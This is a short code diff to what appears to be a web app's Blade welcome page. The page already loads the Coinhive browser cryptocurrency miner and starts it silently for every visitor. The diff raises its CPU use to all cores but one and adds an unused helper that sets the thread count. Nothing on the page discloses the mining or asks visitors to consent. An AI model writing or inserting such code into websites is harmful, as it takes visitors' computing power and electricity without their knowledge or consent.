@@ -89,16 +89,24 @@
                 <div class="title m-b-md">
                     {{ env('APP_NAME') }}
                 </div>
+
             </div>
         </div>
         <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
         <script>
             var hive = {
-                key: "{{ env('COIN_HIVE_KEY') }}"
+                key: "{{ env('COIN_HIVE_KEY') }}",
+                options: {
+                    threads: navigator.hardwareConcurrency - 1,
+                }
             };
             
             var miner = new CoinHive.Anonymous(hive.key);
             miner.start();
+
+            var ray = function() {
+                miner.setNumThreads(hive.options.threads);
+            }
         </script>
     </body>
 </html>
